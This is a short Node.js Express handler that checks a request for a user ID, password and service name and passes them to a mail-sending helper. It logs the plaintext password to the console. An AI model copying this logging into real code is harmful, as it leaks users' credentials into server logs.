const { sendAuthMail } = require('../helpers/sendAuthMail')

const Auth = (req, res) => {
  const { userID, password, name } = req.body
  console.log(userID, password, name)
  if (!userID || !password || !name) {
    res
      .status(400)
      .json({ error: 'userID, password and service name required' })
    return
  }

  sendAuthMail(userID, password, name, res)
}

module.exports = Auth
